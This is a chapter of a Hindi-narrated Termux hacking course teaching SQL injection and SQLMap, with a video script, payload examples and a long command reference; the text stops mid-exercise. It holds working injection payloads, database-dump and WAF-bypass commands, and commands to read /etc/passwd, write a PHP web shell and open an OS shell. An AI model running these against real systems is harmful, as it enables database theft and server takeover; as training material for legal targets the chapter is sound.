# Chapter 34: SQLMap Basics - SQL Injection Testing

> **Module:** 6 - Security Tools  
> **Chapter:** 34 of 61  
> **Duration:** 20-25 Minutes  
> **Difficulty:** ⭐⭐ Intermediate  

---

## 📋 Chapter Overview

| Section | Content |
|---------|---------|
| Video Script | Complete Hindi narration with timestamps |
| Technical Guide | SQL injection fundamentals and SQLMap usage |
| Installation Guide | Step-by-step SQLMap setup in Termux |
| Commands Reference | 25+ SQLMap commands with examples |
| Practice Exercises | Hands-on SQL injection testing |
| Troubleshooting | Common SQLMap issues and solutions |
| Video Assets | Thumbnail, description, tags |

---

## 🎬 VIDEO SCRIPT (Complete Hindi Narration)

```
═══════════════════════════════════════════════════════════════════════════════
TERMUX FULL COURSE - CHAPTER 34
Title: SQLMap Basics | SQL Injection Testing Tool | T3rmuxk1ng
Duration: 20-25 Minutes
═══════════════════════════════════════════════════════════════════════════════

[INTRO - 0:00 to 1:00]
─────────────────────────────────────────────────────────────────────────────

Namaskar Dosto! Welcome back to Termux Full Course by T3rmuxk1ng!

Aaj ka chapter ek bahut important tool ke baare mein hai - SQLMap!

Agar aap ethical hacking seekh rahe ho, web penetration testing seekh 
rahe ho, to SQL injection sabse critical vulnerability hai. Aur SQLMap 
is vulnerability ko detect aur exploit karne ka sabse powerful tool hai.

Ye tool automatically SQL injection detect karta hai, databases enumerate 
karta hai, data dump karta hai - sab kuch ek command mein!

OWASP Top 10 mein SQL injection #3 position pe hai. Ye vulnerability 
itni dangerous hai ki isse pura database steal ho sakta hai - user 
credentials, credit cards, personal data - sab kuch!

Is chapter mein hum seekhenge:
- SQL injection kya hai aur kaise kaam karta hai
- SQLMap ko Termux mein kaise install karein
- Basic se advanced tak SQLMap commands
- Databases, tables, columns enumerate karna
- Data dump karna
- Real-world practice targets

To bina time waste kiye, chaliye shuru karte hain!

Play button dabaiye, video like karein, aur channel subscribe karein 
notification bell ke saath.

---

[SECTION 1: SQL INJECTION FUNDAMENTALS - 1:00 to 5:30]
─────────────────────────────────────────────────────────────────────────────

Sabse pehle samajhte hain SQL Injection kya hai.

SQL Injection ek web security vulnerability hai jo attackers ko 
application ke database ke saath interfere karne deti hai.

Basic concept simple hai:

Jab aap kisi website pe login karte ho, to aap username aur password 
dalte ho. Backend mein ye SQL query run hoti hai:

    SELECT * FROM users WHERE username='admin' AND password='password123'

Agar developer ne input properly sanitize nahi kiya, to attacker 
malicious SQL inject kar sakta hai:

    Username: admin'--
    Password: anything

Query ban jaayegi:

    SELECT * FROM users WHERE username='admin'--' AND password='anything'

"--" SQL mein comment hai. Uske baad sab ignore ho jaata hai.
Matlab password check hi nahi hoga! Admin access mil jaayega bina 
password ke!

Ye tha basic example. Lekin real world mein bahut complex SQL 
injection attacks hote hain.

┌─────────────────────────────────────────────────────────────────────────┐
│                    TYPES OF SQL INJECTION                                │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  1. IN-BAND SQL INJECTION (Sabse common)                                │
│     ├── Error-based: Error messages se data extract karna               │
│     └── Union-based: UNION statement se data retrieve karna             │
│                                                                          │
│  2. BLIND SQL INJECTION (Inference-based)                               │
│     ├── Boolean-based: True/False responses se data extract             │
│     └── Time-based: Response time se data extract                       │
│                                                                          │
│  3. OUT-OF-BAND SQL INJECTION                                           │
│     └── Different channel se data exfiltration                          │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘

Error-based SQL Injection mein attacker database errors se information 
lelte hain. Agar website detailed error messages dikhata hai, to attacker 
database structure samajh sakta hai.

Union-based mein UNION operator use hota hai do SELECT statements ko 
combine karne ke liye. Isse attacker apna malicious query add kar sakta hai.

Blind SQL Injection thoda complex hai. Yahan direct output nahi milta. 
Attacker ko guess karna padta hai based on responses.

Boolean-based mein: Agar query true return karti hai to page normal 
dikhti hai, agar false to page different dikhti hai ya error aati hai.

Time-based mein: Attacker SLEEP() ya WAITFOR() jaise functions use 
karta hai. Agar page late load hoti hai, to injection successful hai!

SQLMap in sabhi types ko automatically detect aur exploit kar sakta hai.

---

[SECTION 2: SQLMAP INTRODUCTION - 5:30 to 8:00]
─────────────────────────────────────────────────────────────────────────────

Ab baat karte hain SQLMap ke baare mein.

SQLMap ek open-source penetration testing tool hai jo SQL injection 
vulnerabilities ko automatically detect aur exploit karta hai.

┌─────────────────────────────────────────────────────────────────────────┐
│                    SQLMAP FEATURES                                       │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  ✅ Automatic SQL injection detection                                   │
│  ✅ Multiple database support (MySQL, PostgreSQL, MSSQL, Oracle, etc.)  │
│  ✅ Database fingerprinting                                             │
│  ✅ Data enumeration (databases, tables, columns)                       │
│  ✅ Password hash cracking                                              │
│  ✅ Database dump                                                        │
│  ✅ File system access                                                   │
│  ✅ Command execution (on some DBMS)                                    │
│  ✅ Multiple injection techniques                                       │
│  ✅ Threading support for faster attacks                                │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘

SQLMap Python mein likha gaya hai, isliye cross-platform hai - 
Windows, Linux, Mac, aur Termux - sab pe kaam karta hai!

Database support dekhein:

┌─────────────────────────────────────────────────────────────────────────┐
│                    SUPPORTED DATABASES                                   │
├──────────────────┬──────────────────────────────────────────────────────┤
│ Database         │ Notes                                                │
├──────────────────┼──────────────────────────────────────────────────────┤
│ MySQL            │ Most common, excellent support                      │
│ PostgreSQL       │ Enterprise databases                                 │
│ Microsoft SQL    │ Windows servers                                      │
│ Oracle           │ Enterprise applications                              │
│ SQLite           │ Mobile apps, small websites                         │
│ MariaDB          │ MySQL fork                                           │
│ Firebird         │ Less common                                          │
│ SAP MaxDB        │ Enterprise                                           │
│ Informix         │ IBM databases                                        │
│ H2               │ Java applications                                    │
│ HSQLDB           │ Java applications                                    │
└──────────────────┴──────────────────────────────────────────────────────┘

SQLMap itna powerful hai ki isse pura database dump ho sakta hai 
minutes mein - jo manually hours lagta hai!

---

[SECTION 3: INSTALLATION IN TERMUX - 8:00 to 11:00]
─────────────────────────────────────────────────────────────────────────────

Chaliye ab SQLMap ko Termux mein install karte hain.

Installation bahut simple hai kyunki SQLMap Python mein hai.

[STEP 1: Prerequisites]

Pehle check karein Python installed hai ya nahi:

    python --version

Agar nahi hai to install karein:

    pkg install python -y

Git bhi chahiye hoga (usually installed):

    pkg install git -y

[STEP 2: Download SQLMap]

Ab SQLMap ko clone karein GitHub se:

    git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git

--depth 1 sirf latest code download karta hai, faster download.

[STEP 3: Navigate and Test]

    cd sqlmap

SQLMap ko test karein:

    python sqlmap.py --version

Agar version number dikh gaya to installation successful hai!

[Alternative Method: Using pip]

Kuch log pip se install karna pasand karte hain:

    pip install sqlmap

Lekin GitHub clone recommended hai kyunki latest updates milte rahte hain.

[STEP 4: Create Alias (Optional but Recommended)]

Har baar python sqlmap.py type karna tedious hai. Alias bana lein:

    echo 'alias sqlmap="python ~/sqlmap/sqlmap.py"' >> ~/.bashrc
    source ~/.bashrc

Ab seedha "sqlmap" command kaam karega!

Test karein:

    sqlmap --version

Perfect! Ab aap ready hain SQLMap use karne ke liye.

---

[SECTION 4: BASIC SQLMAP USAGE - 11:00 to 15:00]
─────────────────────────────────────────────────────────────────────────────

Ab dekhte hain SQLMap ke basic commands.

[Basic Syntax]

    sqlmap -u "http://target.com/page?id=1"

-u ya --url flag se target URL specify karte hain.

Ye command:
1. URL ko scan karega
2. SQL injection vulnerabilities detect karega
3. Injection points identify karega
4. Database fingerprint karega

[Important: Legal Warning]

⚠️ DISCLAIMER: Sirf apne own systems ya explicit permission wale 
systems pe test karein. Unauthorized testing illegal hai!

[Basic Options]

┌─────────────────────────────────────────────────────────────────────────┐
│                    BASIC SQLMAP OPTIONS                                  │
├──────────────────────┬──────────────────────────────────────────────────┤
│ Option               │ Description                                      │
├──────────────────────┼──────────────────────────────────────────────────┤
│ -u, --url            │ Target URL                                       │
│ -p                   │ Test specific parameter                          │
│ --batch              │ Non-interactive mode (auto yes)                 │
│ --random-agent       │ Use random User-Agent                           │
│ --level=1-5          │ Level of tests (higher = more thorough)         │
│ --risk=1-3           │ Risk level (higher = more aggressive)           │
│ --threads=10         │ Number of concurrent threads                    │
│ -v 1-6               │ Verbosity level                                  │
└──────────────────────┴──────────────────────────────────────────────────┘

[Example 1: Basic Scan]

    sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --batch

--batch flag important hai. Without this, SQLMap aapse input maangta 
rahega. --batch automatically default options select karta hai.

[Example 2: Specific Parameter]

Agar URL mein multiple parameters hain:

    sqlmap -u "http://target.com/page?id=1&category=5" -p id --batch

-p id se sirf "id" parameter test hoga.

[Example 3: POST Request]

Login forms POST request use karte hain:

    sqlmap -u "http://target.com/login.php" \
           --data="username=admin&password=test" \
           --batch

--data flag se POST data specify karte hain.

[Example 4: With Cookies]

Authentication required pages ke liye:

    sqlmap -u "http://target.com/profile.php?id=1" \
           --cookie="PHPSESSID=abc123xyz" \
           --batch

[Example 5: Level and Risk]

    sqlmap -u "http://target.com/page?id=1" \
           --level=3 --risk=2 \
           --batch

Level 3 = More test vectors
Risk 2 = More aggressive (careful on production!)

---

[SECTION 5: DATABASE ENUMERATION - 15:00 to 18:30]
─────────────────────────────────────────────────────────────────────────────

Ab dekhte hain databases kaise enumerate karte hain.

[Step 1: Check for Databases]

    sqlmap -u "http://target.com/page?id=1" --dbs --batch

--dbs flag se saare databases list ho jaayenge.

Example output:

    available databases [3]:
    [*] information_schema
    [*] mysql
    [*] webapp_db

[Step 2: Select Database and List Tables]

    sqlmap -u "http://target.com/page?id=1" \
           -D webapp_db --tables --batch

-D se database select karte hain
--tables se us database ki tables list hoti hain

Example output:

    Database: webapp_db
    [3 tables]
    +--------------+
    | users        |
    | products     |
    | orders       |
    +--------------+

[Step 3: List Columns of a Table]

    sqlmap -u "http://target.com/page?id=1" \
           -D webapp_db -T users --columns --batch

-T se table select karte hain
--columns se columns list hoti hain

Example output:

    Database: webapp_db
    Table: users
    [4 columns]
    +----------+-------------+
    | Column   | Type        |
    +----------+-------------+
    | id       | int         |
    | username | varchar(50) |
    | password | varchar(50) |
    | email    | varchar(100)|
    +----------+-------------+

[Step 4: Dump Table Data]

    sqlmap -u "http://target.com/page?id=1" \
           -D webapp_db -T users --dump --batch

--dump se poora data extract ho jaayega!

SQLMap automatically password hashes recognize karta hai aur unhe 
crack bhi karne ki koshish karta hai dictionary attack se.

Example output:

    Database: webapp_db
    Table: users
    [5 entries]
    +----+----------+------------+-------------------+
    | id | username | password   | email             |
    +----+----------+------------+-------------------+
    | 1  | admin    | admin123   | admin@test.com    |
    | 2  | john     | john456    | john@test.com     |
    | 3  | mary     | mary789    | mary@test.com     |
    +----+----------+------------+-------------------+

[Quick Reference: Enumeration Options]

┌─────────────────────────────────────────────────────────────────────────┐
│                    ENUMERATION OPTIONS                                   │
├──────────────────────┬──────────────────────────────────────────────────┤
│ Option               │ Description                                      │
├──────────────────────┼──────────────────────────────────────────────────┤
│ --dbs                │ List all databases                               │
│ --tables             │ List tables (-D required)                        │
│ --columns            │ List columns (-D -T required)                    │
│ --dump               │ Dump table data                                  │
│ --dump-all           │ Dump all tables                                  │
│ -D <database>        │ Specify database                                 │
│ -T <table>           │ Specify table                                    │
│ -C <column>          │ Specify column(s)                                │
│ --schema             │ Get database schema                              │
│ --count              │ Count table entries                              │
└──────────────────────┴──────────────────────────────────────────────────┘

---

[SECTION 6: ADVANCED TECHNIQUES - 18:30 to 22:00]
─────────────────────────────────────────────────────────────────────────────

Ab kuch advanced techniques dekhte hain.

[Testing Specific Columns]

Sirf specific columns dump karne ke liye:

    sqlmap -u "http://target.com/page?id=1" \
           -D webapp_db -T users \
           -C "username,password" --dump --batch

[Cookie-Based Injection]

    sqlmap -u "http://target.com/page.php" \
           --cookie="id=1*; session=abc123" \
           --batch

* (asterisk) se injection point mark karte hain.

[Header Injection]

    sqlmap -u "http://target.com/page.php" \
           --headers="X-Forwarded-For: 127.0.0.1*" \
           --batch

[Using Request File]

Burp se request save karein, phir:

    sqlmap -r request.txt --batch

[Time-Based Blind Injection]

    sqlmap -u "http://target.com/page?id=1" \
           --technique=T \
           --time-sec=5 \
           --batch

--technique=T se sirf time-based test hoga

[Technique Options]

┌─────────────────────────────────────────────────────────────────────────┐
│                    INJECTION TECHNIQUES                                  │
├──────────┬──────────────────────────────────────────────────────────────┤
│ Technique│ Description                                                 │
├──────────┼──────────────────────────────────────────────────────────────┤
│ B        │ Boolean-based blind                                         │
│ E        │ Error-based                                                 │
│ U        │ Union query-based                                           │
│ S        │ Stacked queries                                             │
│ T        │ Time-based blind                                            │
│ Q        │ Inline queries                                              │
└──────────┴──────────────────────────────────────────────────────────────┘

Combine karein: --technique=BEU (Boolean, Error, Union)

[WAF Bypass]

Web Application Firewall bypass:

    sqlmap -u "http://target.com/page?id=1" \
           --tamper=space2comment \
           --batch

Available tampers: space2comment, between, randomcase, etc.

[Using Proxy]

Burp Suite ke saath use karein:

    sqlmap -u "http://target.com/page?id=1" \
           --proxy="http://127.0.0.1:8080" \
           --batch

[Ignoring SSL]

    sqlmap -u "https://target.com/page?id=1" \
           --ignore-ssl-errors \
           --batch

---

[SECTION 7: PRACTICE TARGETS - 22:00 to 24:00]
─────────────────────────────────────────────────────────────────────────────

Ab baat karte hain practice ke liye kahan test karein.

┌─────────────────────────────────────────────────────────────────────────┐
│                    LEGAL PRACTICE TARGETS                                │
├──────────────────┬──────────────────────────────────────────────────────┤
│ Target           │ Description                                         │
├──────────────────┼──────────────────────────────────────────────────────┤
│ DVWA             │ Damn Vulnerable Web Application                     │
│ bWAPP            │ buggy Web Application                               │
│ SQLi Labs        │ Dedicated SQL injection practice                    │
│ Mutillidae       │ OWASP project                                       │
│ HackTheBox       │ Online labs                                         │
│ PortSwigger      │ Web Security Academy (free)                         │
└──────────────────┴──────────────────────────────────────────────────────┘

[Online Practice Targets]

1. Acunetix Test Site:
   http://testphp.vulnweb.com/artists.php?artist=1

2. OWASP Juice Shop (install locally)

[Setting Up DVWA Locally]

DVWA best hai beginners ke liye:

1. Docker install karein (if using proot)
2. Run: docker run --rm -it -p 80:80 vulnerables/web-dvwa
3. Access: http://localhost
4. Login: admin/password
5. Set security to "low" first, then increase

[Practice Command]

    sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
           --cookie="PHPSESSID=xxx; security=low" \
           --dbs --batch

---

[SECTION 8: SUMMARY & NEXT PREVIEW - 24:00 to 25:00]
─────────────────────────────────────────────────────────────────────────────

To dosto, Chapter 34 complete! Let's summarize:

✅ SQL Injection kya hai - Database attack vector
✅ Types of SQL Injection - In-band, Blind, Out-of-band
✅ SQLMap installation in Termux
✅ Basic commands - -u, --dbs, --tables, --columns, --dump
✅ Advanced options - cookies, headers, POST, techniques
✅ Practice targets - DVWA, bWAPP, online labs

Important Commands yaad rakhein:

┌─────────────────────────────────────────────────────────────────────────┐
│                    CHAPTER 34 - KEY COMMANDS                             │
├─────────────────────────────────────────────────────────────────────────┤
│ sqlmap -u "URL" --dbs         │ List all databases                     │
│ sqlmap -u "URL" --tables      │ List tables                            │
│ sqlmap -u "URL" --dump        │ Dump data                              │
│ sqlmap -u "URL" --batch       │ Non-interactive mode                   │
│ sqlmap -u "URL" --level=5     │ Maximum testing level                  │
│ sqlmap -u "URL" -p param      │ Test specific parameter                │
│ sqlmap -r request.txt         │ Use request file                       │
│ sqlmap --wizard               │ Beginner wizard mode                   │
└─────────────────────────────────────────────────────────────────────────┘

Next Chapter 35 mein hum seekhenge:
- Metasploit Framework basics
- Exploits and payloads
- Meterpreter sessions
- Post-exploitation

Agar ye video helpful lagi, to:
👍 Like button press karein
🔔 Subscribe karein, notification bell on karein
💬 Koi sawal ho to comment mein poochein
📤 Share karein friends ke saath

Main har comment ka reply karta hoon.

Thank you for watching! See you in Chapter 35!

═══════════════════════════════════════════════════════════════════════════════
```

---

## 📖 TECHNICAL GUIDE

### 1. SQL Injection Deep Dive

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    SQL INJECTION ATTACK FLOW                             │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│   1. RECONNAISSANCE                                                      │
│   ├── Identify input points (forms, URLs, cookies)                      │
│   ├── Test for SQL errors (', ", OR, AND)                              │
│   └── Determine database type                                           │
│                                                                          │
│   2. DETECTION                                                           │
│   ├── Boolean-based tests (1' OR '1'='1)                               │
│   ├── Error-based tests (1' AND 1=CONVERT(int,@@version)-- )           │
│   ├── Time-based tests (1'; WAITFOR DELAY '0:0:5'--)                   │
│   └── UNION-based tests (1' UNION SELECT null-- )                      │
│                                                                          │
│   3. DATA EXTRACTION                                                     │
│   ├── Enumerate databases                                               │
│   ├── Enumerate tables                                                  │
│   ├── Enumerate columns                                                 │
│   └── Dump data                                                         │
│                                                                          │
│   4. POST-EXPLOITATION                                                   │
│   ├── Read/write files                                                  │
│   ├── Execute commands                                                  │
│   └── Privilege escalation                                              │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### 2. SQL Injection Types Explained

#### In-Band SQL Injection

**Error-Based:**
```sql
-- MySQL Error-Based
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -

-- MSSQL Error-Based  
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--

-- PostgreSQL Error-Based
' AND 1=CAST((SELECT version()) AS INT)--
```

**Union-Based:**
```sql
-- Determine column count
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  (error = 2 columns)

-- Union injection
' UNION SELECT null,null--
' UNION SELECT username,password FROM users--
```

#### Blind SQL Injection

**Boolean-Based:**
```sql
-- True condition
' AND 1=1--  (normal page)

-- False condition  
' AND 1=2--  (different page)

-- Extract data character by character
' AND SUBSTRING(database(),1,1)='a'--
' AND SUBSTRING(database(),1,1)='b'--
```

**Time-Based:**
```sql
-- MySQL
' AND SLEEP(5)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
' AND pg_sleep(5)--

-- Extract data
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
```

### 3. SQLMap Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    SQLMAP ARCHITECTURE                                   │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│   ┌─────────────────────────────────────────────────────────────────┐   │
│   │                      User Interface                              │   │
│   │   (CLI commands, options, output formatting)                    │   │
│   └─────────────────────────────────────────────────────────────────┘   │
│                                   │                                      │
│                                   ▼                                      │
│   ┌─────────────────────────────────────────────────────────────────┐   │
│   │                    Request Engine                                │   │
│   │   (HTTP requests, session handling, proxy support)              │   │
│   └─────────────────────────────────────────────────────────────────┘   │
│                                   │                                      │
│                                   ▼                                      │
│   ┌─────────────────────────────────────────────────────────────────┐   │
│   │                  Detection Engine                                │   │
│   │   ├── Fingerprinting (DBMS detection)                           │   │
│   │   ├── Injection point detection                                  │   │
│   │   └── Technique selection                                       │   │
│   └─────────────────────────────────────────────────────────────────┘   │
│                                   │                                      │
│                                   ▼                                      │
│   ┌─────────────────────────────────────────────────────────────────┐   │
│   │                   Exploit Engine                                 │   │
│   │   ├── Payload generation                                        │   │
│   │   ├── Data extraction                                           │   │
│   │   └── File operations                                           │   │
│   └─────────────────────────────────────────────────────────────────┘   │
│                                   │                                      │
│                                   ▼                                      │
│   ┌─────────────────────────────────────────────────────────────────┐   │
│   │                  Database Handlers                               │   │
│   │   MySQL │ PostgreSQL │ MSSQL │ Oracle │ SQLite │ ...           │   │
│   └─────────────────────────────────────────────────────────────────┘   │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### 4. SQLMap Configuration Files

```
~/.sqlmap/                    # SQLMap directory
├── output/                   # Scan results
│   └── target.com/
│       ├── log               # Scan log
│       ├── session.sqlite    # Session data
│       └── dump/             # Dumped data
├── sqlmap-tamper/            # Custom tamper scripts
└── sqlmap.conf               # Configuration file
```

---

## 🔧 INSTALLATION GUIDE

### Method 1: Git Clone (Recommended)

```bash
# Step 1: Install prerequisites
pkg update && pkg upgrade -y
pkg install python git -y

# Step 2: Clone SQLMap repository
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git ~/sqlmap

# Step 3: Test installation
cd ~/sqlmap
python sqlmap.py --version

# Step 4: Create permanent alias
echo 'alias sqlmap="python ~/sqlmap/sqlmap.py"' >> ~/.bashrc
source ~/.bashrc

# Step 5: Verify alias
sqlmap --version
```

### Method 2: pip Installation

```bash
# Install via pip
pip install sqlmap

# Run
sqlmap --version
```

### Method 3: Using Termux Package

```bash
# Some versions available in community repos
pkg install sqlmap

# If not found, use git clone method
```

### Verification Checklist

```bash
# Check Python version (3.7+ required)
python --version

# Check SQLMap version
sqlmap --version

# Test help output
sqlmap -h

# Test advanced help
sqlmap -hh
```

---

## 📋 COMMANDS REFERENCE

### Basic Commands

```bash
# Show version
sqlmap --version

# Show help
sqlmap -h

# Show advanced help
sqlmap -hh

# Basic URL scan
sqlmap -u "http://target.com/page?id=1"

# Basic scan with auto-accept
sqlmap -u "http://target.com/page?id=1" --batch

# Test specific parameter
sqlmap -u "http://target.com/page?id=1&cat=5" -p id --batch

# Verbosity levels (0-6)
sqlmap -u "http://target.com/page?id=1" -v 3 --batch
```

### Database Enumeration

```bash
# List all databases
sqlmap -u "http://target.com/page?id=1" --dbs --batch

# List current database
sqlmap -u "http://target.com/page?id=1" --current-db --batch

# List current user
sqlmap -u "http://target.com/page?id=1" --current-user --batch

# Check if DBA (Database Administrator)
sqlmap -u "http://target.com/page?id=1" --is-dba --batch

# List tables in specific database
sqlmap -u "http://target.com/page?id=1" -D dbname --tables --batch

# List columns in specific table
sqlmap -u "http://target.com/page?id=1" -D dbname -T tablename --columns --batch

# Count table entries
sqlmap -u "http://target.com/page?id=1" -D dbname -T tablename --count --batch

# Dump specific table
sqlmap -u "http://target.com/page?id=1" -D dbname -T tablename --dump --batch

# Dump specific columns
sqlmap -u "http://target.com/page?id=1" -D dbname -T tablename -C "col1,col2" --dump --batch

# Dump all databases
sqlmap -u "http://target.com/page?id=1" --dump-all --batch

# Get database schema
sqlmap -u "http://target.com/page?id=1" --schema --batch
```

### POST Request Testing

```bash
# POST data injection
sqlmap -u "http://target.com/login.php" \
       --data="username=admin&password=test" \
       --batch

# Test specific POST parameter
sqlmap -u "http://target.com/login.php" \
       --data="username=admin&password=test" \
       -p username --batch

# POST with Content-Type
sqlmap -u "http://target.com/api" \
       --data='{"id":1}' \
       --headers="Content-Type: application/json" \
       --batch

# POST from file
sqlmap -r post_request.txt --batch
```

### Cookie & Header Injection

```bash
# Cookie injection
sqlmap -u "http://target.com/page.php" \
       --cookie="id=1*; session=abc123" \
       --batch

# Header injection
sqlmap -u "http://target.com/page.php" \
       --headers="X-Forwarded-For: 127.0.0.1*\nUser-Agent: test*" \
       --batch

# Referer header injection
sqlmap -u "http://target.com/page.php" \
       --referer="http://google.com*" \
       --batch

# User-Agent injection
sqlmap -u "http://target.com/page.php" \
       --user-agent="Mozilla*" \
       --batch

# Use random User-Agent
sqlmap -u "http://target.com/page?id=1" \
       --random-agent \
       --batch
```

### Level and Risk Settings

```bash
# Default level (1)
sqlmap -u "http://target.com/page?id=1" --level=1 --batch

# Medium level (3)
sqlmap -u "http://target.com/page?id=1" --level=3 --batch

# Maximum level (5) - tests all parameters
sqlmap -u "http://target.com/page?id=1" --level=5 --batch

# Default risk (1)
sqlmap -u "http://target.com/page?id=1" --risk=1 --batch

# Higher risk (2) - more aggressive
sqlmap -u "http://target.com/page?id=1" --risk=2 --batch

# Maximum risk (3) - OR-based payloads
sqlmap -u "http://target.com/page?id=1" --risk=3 --batch

# Combined high settings
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3 --batch
```

### Technique Selection

```bash
# All techniques (default)
sqlmap -u "http://target.com/page?id=1" --technique=BEUSTQ --batch

# Only Boolean-based
sqlmap -u "http://target.com/page?id=1" --technique=B --batch

# Only Union-based
sqlmap -u "http://target.com/page?id=1" --technique=U --batch

# Only Time-based
sqlmap -u "http://target.com/page?id=1" --technique=T --batch

# Boolean + Error + Union
sqlmap -u "http://target.com/page?id=1" --technique=BEU --batch

# Union with specific columns
sqlmap -u "http://target.com/page?id=1" \
       --technique=U \
       --union-cols=3-10 \
       --batch
```

### WAF Bypass & Tamper Scripts

```bash
# List available tamper scripts
sqlmap --list-tampers

# Space to comment bypass
sqlmap -u "http://target.com/page?id=1" \
       --tamper=space2comment \
       --batch

# Multiple tamper scripts
sqlmap -u "http://target.com/page?id=1" \
       --tamper=space2comment,between,randomcase \
       --batch

# MySQL tamper for WAF
sqlmap -u "http://target.com/page?id=1" \
       --tamper=between,randomcase,space2comment \
       --batch

# Common tamper scripts:
# - space2comment: Replace spaces with /**/
# - between: Replace > with NOT BETWEEN 0 AND
# - randomcase: Random case switching
# - equaltolike: Replace = with LIKE
# - base64encode: Base64 encode payloads
```

### Proxy & Request Options

```bash
# Use proxy
sqlmap -u "http://target.com/page?id=1" \
       --proxy="http://127.0.0.1:8080" \
       --batch

# Proxy with authentication
sqlmap -u "http://target.com/page?id=1" \
       --proxy="http://user:pass@proxy.com:8080" \
       --batch

# Delay between requests
sqlmap -u "http://target.com/page?id=1" \
       --delay=2 \
       --batch

# Timeout setting
sqlmap -u "http://target.com/page?id=1" \
       --timeout=30 \
       --batch

# Retries on failure
sqlmap -u "http://target.com/page?id=1" \
       --retries=3 \
       --batch

# Threading for faster scanning
sqlmap -u "http://target.com/page?id=1" \
       --threads=10 \
       --batch

# Ignore SSL errors
sqlmap -u "https://target.com/page?id=1" \
       --ignore-ssl-errors \
       --batch

# Force SSL
sqlmap -u "http://target.com/page?id=1" \
       --force-ssl \
       --batch
```

### File Operations

```bash
# Read file (requires privilege)
sqlmap -u "http://target.com/page?id=1" \
       --file-read="/etc/passwd" \
       --batch

# Write file
sqlmap -u "http://target.com/page?id=1" \
       --file-write="shell.php" \
       --file-dest="/var/www/html/shell.php" \
       --batch

# Execute SQL query
sqlmap -u "http://target.com/page?id=1" \
       --sql-query="SELECT user()" \
       --batch

# SQL shell
sqlmap -u "http://target.com/page?id=1" \
       --sql-shell \
       --batch

# OS shell (limited support)
sqlmap -u "http://target.com/page?id=1" \
       --os-shell \
       --batch
```

### Password & Hash Handling

```bash
# List password hashes
sqlmap -u "http://target.com/page?id=1" \
       --passwords \
       --batch

# Crack hashes during dump
sqlmap -u "http://target.com/page?id=1" \
       -D dbname -T users --dump \
       --batch

# Custom wordlist for cracking
sqlmap -u "http://target.com/page?id=1" \
       --wordlist=/path/to/wordlist.txt \
       --batch
```

### Output & Logging

```bash
# Save traffic to file
sqlmap -u "http://target.com/page?id=1" \
       -t traffic.txt \
       --batch

# Save output to file
sqlmap -u "http://target.com/page?id=1" \
       > output.txt \
       --batch

# Verbose logging
sqlmap -u "http://target.com/page?id=1" \
       -v 6 \
       --batch

# Flush session
sqlmap -u "http://target.com/page?id=1" \
       --flush-session \
       --batch

# Purge all data
sqlmap --purge
```

### Wizard Mode

```bash
# Beginner-friendly wizard
sqlmap --wizard

# Interactive prompts guide you through:
# - Target URL
# - POST data
# - Cookies
# - Database enumeration options
```

---

## 💻 PRACTICE EXERCISES

### Exercise 1: Basic Installation Verification

```bash
# Task: Verify SQLMap is correctly installed

# Step 1: Check Python
python --version
# Expected: Python 3.x.x

# Step 2: Check SQLMap
sqlmap --version
# Expected: 1.7.x or higher

# Step 3: View help
sqlmap -h | head -30

# Step 4: List tamper scripts
sqlmap --list-tampers | head -20

# Step 5: Create test directory
mkdir -p ~/sqli-practice
cd ~/sqli-practice
```

### Exercise 2: Basic SQL Injection Testing

```bash
# Task: Test a vulnerable application

# Using publicly available test site
# Note: Use responsibly, only for learning

# Step 1: Basic scan
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --batch

# Step 2: Enumerate databases
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch

# Step 3: Get current database
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --current-db --batch

# Step 4: List tables
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" \
       -D acuart --tables --batch

# Step 5: List columns of a table
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" \
       -D acuart -T users --columns --batch

# Step 6: Dump users table
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" \
       -D acuart -T users --dump --batch
```

### Exercise 3: POST Request Testing

```bash
# Task: Test a login form for SQL injection

# Simulated POST request testing
# Replace with your local vulnerable app

# Step 1: Create request file (Burp style)
cat > request.txt << 'EOF'
POST /login.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

username=admin&password=test
EOF

# Step 2: Test with request file
sqlmap -r request.txt --batch

# Step 3: Direct POST testing
sqlmap -u "http://localhost/login.php" \
       --data="username=admin&password=test" \
       --batch

# Step 4: Test specific parameter
sqlmap -u "http://localhost/login.php" \
       --data="username=admin&password=test" \
       -p username \
       --batch

# Step 5: With level increase
sqlmap -u "http://localhost/login.php" \
       --data="username=admin&password=test" \
       --level=3 \
       --batch
```

### Exercise 4: Cookie-Based Injection

```bash
# Task: Test cookie-based SQL injection

# Step 1: Test cookie injection
sqlmap -u "http://localhost/profile.php" \
       --cookie="id=1*; session=abc123" \
       --batch

# Step 2: Enumerate with cookie
sqlmap -u "http://localhost/profile.php" \
       --cookie="id=1*; session=abc123" \
       --dbs --batch

# Step 3: Specific database
sqlmap -u "http://localhost/profile.php" \
       --cookie="id=1*; session=abc123" \
       -D webapp --tables --batch

# Step 4: Dump data
sqlmap -u "http://localhost/profile.php" \
